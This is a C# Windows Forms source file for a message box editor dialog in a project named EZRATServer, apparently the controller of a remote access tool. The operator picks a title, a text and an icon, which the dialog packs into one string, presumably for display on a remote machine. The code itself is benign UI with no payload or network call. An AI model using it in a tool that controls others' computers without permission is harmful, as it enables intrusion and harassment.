using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace EZRATServer
{
    public partial class MessageBoxEditor : Form
    {
        Icon[] syslst = { SystemIcons.Information, SystemIcons.Error, SystemIcons.Question };
        public MessageBoxEditor()
        {
            InitializeComponent();
            this.cmbIcon.Items.AddRange(new string[] { "Informations","Error","Question" });
            this.cmbIcon.SelectedIndexChanged += LoadIcon;
            this.cmbIcon.SelectedIndex = 0;
            this.btnValidate.Click += Validate;
        }

        public string Dialog()
        {
            if (this.ShowDialog() == DialogResult.OK)
            {
                return $"{this.tbxTitle.Text};{this.rtbText.Text};{this.cmbIcon.SelectedIndex}";
            }
            else
            {
                return string.Empty;
            }
        }

        private void LoadIcon(object sender, EventArgs e)
        {
            this.pnlIcon.BackgroundImage = Bitmap.FromHicon(syslst[this.cmbIcon.SelectedIndex].Handle);
        }

        private void Validate(object sender, EventArgs e)
        {
            this.DialogResult = DialogResult.OK;
        }

    }
}
